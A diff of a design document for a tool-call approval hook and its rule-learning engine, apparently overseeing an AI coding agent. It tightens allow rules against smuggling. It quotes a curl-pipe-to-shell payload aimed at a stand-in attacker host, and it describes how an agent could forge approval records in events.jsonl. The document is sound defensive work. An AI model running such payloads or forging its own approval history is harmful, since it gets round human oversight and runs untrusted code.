@@ -403,12 +403,15 @@ TUI shows:
   └─────────────────────────────────────────────────────────┘
 ```
 
-Accepting writes to `config.json`:
+Accepting writes to `config.json`. The learner writes the **anchored `allow_prefix`** rule
+type (I2) — **never** the substring `allow_patterns` array, which `apply_tool_rules`
+(`wisphive_hook/src/main.rs:~1499`) matches as a case-insensitive substring and which a
+learned entry would turn into a smuggling oracle (`curl attacker.com/x | sh  # cargo test`):
 ```json
 {
     "tool_rules": {
         "Bash": {
-            "allow_patterns": ["cargo test"],
+            "allow_prefix": ["cargo test"],
             "_learned": {
                 "cargo test": {
                     "source": "learning_engine",
@@ -422,7 +425,10 @@ Accepting writes to `config.json`:
 }
 ```
 
-The `_learned` key is metadata only (ignored by the hook's rule evaluation). It records provenance so the user can audit which rules were human-written vs. machine-suggested.
+The `allow_prefix` rule type is new (it does not exist in the hook yet — it ships with this
+engine, matching only the parsed first command per I2). The `_learned` key is metadata only
+(ignored by rule evaluation); it records provenance so the user can audit which rules were
+human-written vs. machine-suggested.
 
 #### Mode: `"auto"` (opt-in, requires understanding of risks)
 
@@ -504,8 +510,8 @@ Learn-time classification is insufficient: `cargo test` may be Clean as a *patte
 
 Rows counted toward a pattern's confidence must satisfy **all** of:
 
-- **Daemon-witnessed — key on the `auto_approved` column, NOT the `decided_by` text.** The sound, unforgeable handle already exists in the schema: every row the daemon ingests from `events.jsonl` is written with `auto_approved = 1` regardless of the `decided_by` string in the appended line (`decisions.rs` forces it), while decisions the daemon resolves through its own oneshot path keep `auto_approved = 0`. Evidence therefore selects on `auto_approved = 0` alone. **Do not** filter on `decided_by = human`: `decided_by` is copied verbatim from the `events.jsonl` line by `ingest_line`, so an agent can append `{"event":"auto_approved","decided_by":"human:tui",...}` and — although it lands as `auto_approved = 1` and is thus excluded from learning — the forged `human:*` label would otherwise surface in `wisphive audit`. Two hardening asks fall out and are filed: (1) the learning query keys on `auto_approved = 0`; (2) `ingest_line` rejects/relabels any ingested `decided_by` beginning `human:` or `timeout:` so forged operator attribution can never enter the audit stream.
-- **Individually reviewed:** among `auto_approved = 0` rows, exclude bulk resolutions — a bulk approve is queue hygiene, not a per-call judgment. Today `decided_by` is `human:tui` / `human:web:<id>` and does not distinguish bulk from individual; add that axis (itr#426). Note this is the *same field* as I7's `human:<resolver>` provenance — one `decided_by` string encodes both resolver and bulk/individual (e.g. `human:tui:individual`); I4 and I7 must agree on its grammar.
+- **Daemon-witnessed — select `auto_approved = 0 AND decision = 'approve'`, NOT the `decided_by` text.** The forgery-resistant handle is the pair of *structural* columns, not the copyable label. Precise mechanics (verified against code): the daemon writes `auto_approved = i64::from(decision == "approve")` for **every** row, including ingested ones (`decisions.rs:371`), and the `events.jsonl` ingest maps event kinds to decisions — `auto_approved → approve`, `deferred → ask`, `denied → deny` (`event_ingest.rs:290-292`). So a forged `{"event":"auto_approved",...}` append lands as `auto_approved = 1` (excluded because the learner wants `auto_approved = 0`), and a forged `{"event":"denied"|"deferred",...}` append lands as `auto_approved = 0` but with `decision` = `deny`/`ask` (excluded because the learner wants `decision = 'approve'`). The conjunction `auto_approved = 0 AND decision = 'approve'` therefore admits **only** approvals the daemon resolved itself — no `events.jsonl` row can enter it. (An earlier draft of this bullet claimed every ingested row is `auto_approved = 1`; that is false for `deferred`/`denied` and is the reason the filter must be the *conjunction*, not `auto_approved = 0` alone.) **Do not** filter on `decided_by = human`: `decided_by` is copied verbatim from the appended line by `ingest_line`, so a forged `human:*` label, while it can never enter the evidence set above, would still surface in `wisphive audit`. Hardening asks (filed, itr#426): the learning query uses the conjunction above; and `ingest_line` rejects/relabels any ingested `decided_by` beginning `human:` or `timeout:` so forged operator attribution never enters the audit stream.
+- **Individually reviewed:** among the daemon-witnessed approvals selected above, exclude bulk resolutions and daemon-automatic approvals (`decided_by` beginning `timeout:` — trustworthy here because these are daemon-stamped, not ingested) — a bulk approve is queue hygiene, not a per-call judgment. Today `decided_by` is `human:tui` / `human:web:<id>` and does not distinguish bulk from individual; add that axis (itr#426). Note this is the *same field* as I7's `human:<resolver>` provenance — one `decided_by` string encodes both resolver and bulk/individual (e.g. `human:tui:individual`); I4 and I7 must agree on its grammar.
 - **Unredacted:** rows whose `tool_input` contains the redaction marker (itr#89) are excluded — the true content is unknown, and learning a pattern containing `***REDACTED***` is meaningless at best.
 
 **Attacks closed:** forged approval history via `events.jsonl` appends (excluded by the `auto_approved` column, and forged `human:*` labels blocked at ingest); confidence inflation via the human's own bulk-approve habit; pattern extraction from content the system deliberately refused to persist.
@@ -659,7 +665,7 @@ pub struct PolicySuggestion {
     pub id: Uuid,
     pub tool_name: String,
     pub pattern: String,
-    pub rule_type: String,           // "allow_patterns", "allow_regex", "deny_patterns"
+    pub rule_type: String,           // "allow_prefix" (Bash) | "allow_path" (Write/Edit) — the anchored types per I2; NEVER "allow_patterns" (substring)
     pub evidence: PatternEvidence,
     pub confidence: f64,
     pub sus_level: SusLevel,
